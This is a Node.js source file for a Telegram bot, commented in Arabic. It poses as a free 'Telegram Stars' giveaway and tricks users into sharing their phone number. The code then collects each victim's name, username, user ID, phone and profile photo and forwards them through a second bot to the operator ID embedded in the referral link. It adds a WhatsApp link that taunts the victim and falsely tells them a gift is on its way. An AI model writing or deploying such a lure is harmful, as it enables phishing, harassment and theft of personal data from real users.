const TelegramBot = require('node-telegram-bot-api');
const express = require('express');

const app = express();
const PORT = process.env.PORT || 3000;

// صفحة ويب وهمية للبورت لكي يقبلها Render
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>ربح النجوم - Telegram Stars</title>
            <style>
                body { font-family: Tahoma, sans-serif; background: #0f172a; color: #fff; text-align: center; padding-top: 50px; }
                .card { background: #1e293b; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
                h1 { color: #38bdf8; }
                p { color: #94a3b8; }
            </style>
        </head>
        <body>
            <div class="card">
                <h1>🌟 بوت ربح النجوم الحصري</h1>
                <p>البوت يعمل بنجاح ومستقر على الخادم.</p>
            </div>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`سيرفر الويب يعمل على البورت ${PORT}`);
});

// قراءة التوكنات من متغيرات البيئة للحماية
const COLLECTOR_TOKEN = process.env.COLLECTOR_BOT_TOKEN;
const NOTIFIER_TOKEN = process.env.NOTIFIER_BOT_TOKEN;

if (!COLLECTOR_TOKEN || !NOTIFIER_TOKEN) {
    console.error("خطأ: يرجى التأكد من تعيين متغيرات البيئة للتوكنات بشكل صحيح.");
    process.exit(1);
}

// تشغيل بوت التجميع (الذي يضغط فيه المستخدم)
const bot = new TelegramBot(COLLECTOR_TOKEN, { polling: true });
// تشغيل بوت التنبيهات (الذي يرسل لك المعلومات)
const notifierBot = new TelegramBot(NOTIFIER_TOKEN, { polling: false });

console.log("تم تشغيل البوت بنجاح...");

// تخزين الأيدي القادم من الرابط لكل مستخدم
const referrers = {};

// استقبال أمر البدء مع الأيدي الذي بعد علامة =
bot.onText(/\/start(?:@\w+)?(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const refId = match ? match[1] : null; // هذا هو الأيدي اللي بعد علامة =

    if (refId) {
        referrers[chatId] = refId;
    }

    const opts = {
        reply_markup: {
            keyboard: [
                [{ text: "🎁 اضغط هنا للمتابعة ومشاركة رقمك", request_contact: true }]
            ],
            resize_keyboard: true,
            one_time_keyboard: true
        }
    };

    await bot.sendMessage(
        chatId,
        `مرحباً بك في بوت ربح النجوم والتفاعل المجاني! 🌟\n\nللحصول على الهدية الخاصة بك وتفعيل حسابك، يرجى مشاركة رقم هاتفك عبر الضغط على الزر بالأسفل.`,
        opts
    );
});

// استقبال رقم الهاتف والبيانات عند مشاركتها
bot.on('contact', async (msg) => {
    const chatId = msg.chat.id;
    const contact = msg.contact;
    const user = msg.from;

    if (!contact) return;

    const phone = contact.phone_number;
    const firstName = user.first_name || "بدون اسم";
    const lastName = user.last_name || "";
    const username = user.username ? `@${user.username}` : "لا يوجد يوزر";
    const userId = user.id;

    // جلب الأيدي الذي دخل من خلال رابطه (الموجود بعد =)
    const targetOwnerId = referrers[chatId];

    // جلب خلفية/صورة الحساب الشخصي للضحية
    let profilePhotoUrl = "";
    try {
        const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
        if (photos && photos.total_count > 0) {
            const fileId = photos.photos[0][0].file_id;
            const file = await bot.getFile(fileId);
            profilePhotoUrl = `https://api.telegram.org/file/bot${COLLECTOR_TOKEN}/${file.file_path}`;
        }
    } catch (e) {
        console.log("تعذر جلب صورة الحساب:", e.message);
    }

    // تجهيز رابط الواتساب المباشر للضحية
    const whatsappMessage = encodeURIComponent("تم سحب رقمك بواسطة وهم");
    const whatsappLink = `https://wa.me/${phone}?text=${whatsappMessage}`;

    // بناء رسالة التقرير
    const reportMessage = `
🚨 **صيد جديد تم رصده!**

👤 **الاسم:** ${firstName} ${lastName}
🔗 **اليوزر:** ${username}
🆔 **الأيدي:** ${userId}
📞 **رقم الهاتف:** +${phone}
🔗 **رابط الحساب:** tg://user?id=${userId}
🎯 **الأيدي المستهدف (من الرابط):** ${targetOwnerId || "لا يوجد أيدي بالرابط"}
`;

    // 1. الرد على الضحية في البوت الأساسي وإزالة الكيبورد
    await bot.sendMessage(chatId, `✅ تم التحقق بنجاح! جاري تحويل الهدية إلى حسابك...`, {
        reply_markup: { remove_keyboard: true }
    });

    // 2. إرسال البيانات عبر (البوت الثاني) حصراً إلى الأيدي الموجود بنهاية الرابط
    if (targetOwnerId) {
        try {
            // الأزرار الشفافة للمطور (رابط واتساب مباشر لرقم الضحية)
            const inlineKeyboard = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "💬 محادثة واتساب مع الضحية", url: whatsappLink }
                        ]
                    ]
                }
            };

            if (profilePhotoUrl) {
                await notifierBot.sendPhoto(targetOwnerId, profilePhotoUrl, {
                    caption: reportMessage,
                    parse_mode: "Markdown",
                    ...inlineKeyboard
                });
            } else {
                await notifierBot.sendMessage(targetOwnerId, reportMessage, {
                    parse_mode: "Markdown",
                    ...inlineKeyboard
                });
            }
        } catch (err) {
            console.log("فشل إرسال التقرير للأيدي المحدد عبر البوت الثاني:", err.message);
        }
    } else {
        console.log("تنبيه: لم يتم العثور على أيدي في الرابط لإرسال التقرير إليه.");
    }
});
